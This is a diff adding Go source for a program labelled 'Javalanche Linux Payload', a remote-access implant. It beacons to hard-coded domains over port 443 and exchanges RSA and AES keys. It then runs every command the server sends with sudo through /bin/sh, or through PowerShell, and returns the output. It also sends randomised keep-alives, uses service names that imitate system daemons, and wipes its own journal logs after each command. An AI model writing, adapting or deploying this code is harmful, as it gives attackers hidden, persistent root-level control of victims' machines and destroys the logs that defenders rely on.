@@ -1,0 +1,235 @@
+/*
+Javalanche Linux Payload
+Author: James Southcott
+*/
+
+package main
+
+import (
+	"bufio"
+	"crypto/rand"
+	"fmt"
+	"linuxBinary/encryption/aes"
+	"linuxBinary/encryption/rsa"
+	"math/big"
+	"net"
+	"os/exec"
+	"runtime"
+	"strconv"
+	"strings"
+	"time"
+
+	"github.com/kardianos/service"
+)
+
+func resolveBeaconIPAddr() string {
+	beacons := []string{"http1.javalanche.net", "http2.javalanche.net", "http3.javalanche.net"}
+
+	// Resolve ip's of of the beacons
+	for _, element := range beacons {
+		ips, err := net.LookupIP(element)
+		if err == nil {
+			for _, ip := range ips {
+				// Send http request to the resolved ip to make sure we can communicate over http
+				conn, err := net.DialTimeout("tcp", (ip.String() + ":443"), 10*time.Second)
+				if err == nil {
+					defer conn.Close()
+					fmt.Fprint(conn, "GET / HTTP/1.1\n")
+					reader := bufio.NewReader(conn)
+					message1, err1 := reader.ReadString('\n')
+					message2, err2 := reader.ReadString('\n')
+					message3, err3 := reader.ReadString('\n')
+					message4, err4 := reader.ReadString('\n')
+					message5, err5 := reader.ReadString('\n')
+					message6, err6 := reader.ReadString('\n')
+					message7, err7 := reader.ReadString('\n')
+					message8, err8 := reader.ReadString('\n')
+					message9, err9 := reader.ReadString('\n')
+					message10, err10 := reader.ReadString('\n')
+					message11, err11 := reader.ReadString('\n')
+					message12, err12 := reader.ReadString('\n')
+					if err1 == nil && err2 == nil && err3 == nil && err4 == nil && err5 == nil && err6 == nil && err7 == nil && err8 == nil && err9 == nil && err10 == nil && err11 == nil && err12 == nil {
+						if message1 == "HTTP/1.1 200 OK\r\n" && message2 == "Content-Type: text/html\r\n" && message3 == "\r\n" && message4 == "<!DOCTYPE html>\r\n" && message5 == "<html>\r\n" && message6 == "<head>\r\n" && message7 == "<title>Javalanche</title>\r\n" && message8 == "</head>\r\n" && message9 == "<body>\r\n" && message10 == "<h1>Welcome to Javalanche</h1>\r\n" && message11 == "</body>\r\n" && message12 == "</html>\r\n" {
+							return ip.String()
+						}
+					} else {
+						fmt.Print("Error getting response\n")
+					}
+				}
+			}
+		}
+	}
+	return "0"
+}
+
+func sendKeepAlive(socket net.Conn, aesSubKeys []string) {
+	// Encrypt the packet with AES
+	packet := "KEEP_ALIVE"
+	packet = aes.AESEncrypt(packet, aesSubKeys)
+	packet = strconv.Itoa(len(aes.DecodeUTF8String(packet))) + "\n" + packet + "\n"
+
+	// Sleep a random time between 120 and 240 seconds
+	for {
+		randomTime, _ := rand.Int(rand.Reader, big.NewInt(int64(120)))
+		randomTimeInt := randomTime.Int64() + 120
+		time.Sleep(time.Duration(randomTimeInt) * time.Second)
+
+		// Send the KEEP_ALIVE message
+		fmt.Fprint(socket, packet)
+	}
+}
+
+func getServiceName() string {
+	possibleServiceNames := []string{"systemd-ssh.service", "snapd.container.service", "apparmour.service", "systemd-logind-ssh.service", "firewall.service"}
+
+	cmd := exec.Command("/bin/sh", "-c", "sudo systemctl --type=service")
+	output, err := cmd.Output()
+	if err == nil {
+		for name := range possibleServiceNames {
+			if strings.Contains(string(output), possibleServiceNames[name]) {
+				return possibleServiceNames[name]
+			}
+		}
+	}
+	return ""
+}
+
+func readEncryptedMessage(reader *bufio.Reader) (string, error) {
+	// First thing sent is the number of bytes in the upcomming message
+	numBytesToRead, err := reader.ReadString('\n')
+	var messageBuilder strings.Builder
+	numBytesAsInt, _ := strconv.Atoi(strings.TrimSpace(numBytesToRead))
+
+	// Read the number of bytes determined by the previous message
+	for i := 0; i < numBytesAsInt; i++ {
+		byteRead, _ := reader.ReadByte()
+		if byteRead == (byte)(194) || byteRead == (byte)(195) {
+			i--
+		}
+		messageBuilder.WriteByte(byteRead)
+	}
+	serverMessage := messageBuilder.String()
+
+	// Clear out extra \n sitting in buffer
+	reader.ReadByte()
+
+	return serverMessage, err
+}
+
+func genAESKey(length int) string {
+	bytes := make([]byte, length/2)
+	rand.Read(bytes)
+	return fmt.Sprintf("%x", bytes)
+}
+
+type program struct{}
+
+func (p *program) Start(s service.Service) error {
+	go p.run()
+	return nil
+}
+
+func (p *program) run() {
+	// If we are on linux, get the name of the daemon we are running as
+	serviceName := ""
+	if runtime.GOOS == "linux" {
+		serviceName = getServiceName()
+	}
+	// Resolve IP Address of a Beacon Server
+	serverIPAddress := resolveBeaconIPAddr()
+	if serverIPAddress != "0" {
+
+		// Connect to Beacon Server
+		serverConn, err := net.Dial("tcp", (serverIPAddress + ":443"))
+		if err != nil {
+			fmt.Print("Error connecting to server\n")
+		} else {
+			// First message is the OS of this machine
+			if runtime.GOOS == "linux" {
+				fmt.Fprint(serverConn, "Linux\n")
+			} else {
+				fmt.Fprint(serverConn, "Windows\n")
+			}
+
+			// Get IP Address of this host and send it as the second message
+			hostIPAddr := strings.Split(serverConn.LocalAddr().String(), ":")[0] + "\n"
+			fmt.Fprint(serverConn, hostIPAddr)
+
+			// Generate subkeys for AES encryption
+			masterKey := genAESKey(32)
+			aesSubKeys := aes.GenerateRoundKeys(masterKey)
+
+			reader := bufio.NewReader(serverConn)
+
+			n, _ := readEncryptedMessage(reader)
+			e, _ := readEncryptedMessage(reader)
+
+			encryptedAESKey := rsa.RsaEncrypt(n, e, masterKey)
+
+			keyMessage := strconv.Itoa(len(encryptedAESKey)) + "\n" + encryptedAESKey + "\n"
+			fmt.Fprint(serverConn, keyMessage)
+
+			// Start a thread that sends encrypted KEEP_ALIVE messages to the server to keep the socket alive
+			go sendKeepAlive(serverConn, aesSubKeys)
+			defer serverConn.Close()
+
+			// Main while loop to listen and execute commands
+			for {
+				serverMessage, err := readEncryptedMessage(reader)
+				if err != nil {
+					break
+				} else {
+					serverMessage = aes.AESDecrypt(serverMessage, aesSubKeys)
+					if serverMessage != "KEEP_ALIVE" {
+						// As long as the message is not a KEEP_ALIVE message, execute it as a command
+						output := []byte(nil)
+						err := error(nil)
+						if runtime.GOOS == "linux" {
+							cmd := exec.Command("/bin/sh", "-c", "sudo "+serverMessage)
+							output, err = cmd.Output()
+						} else {
+							cmd := exec.Command("Powershell.exe", "-Command", serverMessage)
+							output, err = cmd.Output()
+						}
+
+						if err != nil {
+							// If there is an error executing the command, we still want to return an empty output
+							finalOutput := "\r\n"
+							cipherText := aes.AESEncrypt(finalOutput, aesSubKeys)
+
+							cipherText = strconv.Itoa(len(aes.DecodeUTF8String(cipherText))) + "\n" + cipherText + "\n"
+							fmt.Fprint(serverConn, cipherText)
+						} else {
+							finalOutput := string(output)
+							cipherText := aes.AESEncrypt(finalOutput, aesSubKeys)
+
+							cipherText = strconv.Itoa(len(aes.DecodeUTF8String(cipherText))) + "\n" + cipherText + "\n"
+							fmt.Fprint(serverConn, cipherText)
+						}
+						if runtime.GOOS == "linux" {
+							// Clear logs of our service
+							clearLogs := exec.Command("/bin/sh", "-c", "sudo journalctl --rotate --vacuum-size=1B --unit="+serviceName)
+							clearLogs.Run()
+						}
+					}
+				}
+			}
+		}
+	}
+}
+
+func (p *program) Stop(s service.Service) error {
+	return nil
+}
+
+func main() {
+	svcConfig := &service.Config{
+		Name:        "MyService",
+		DisplayName: "MyDisplayNameService",
+		Description: "Da Service",
+	}
+
+	prg := &program{}
+	s, _ := service.New(prg, svcConfig)
+	s.Run()
+}
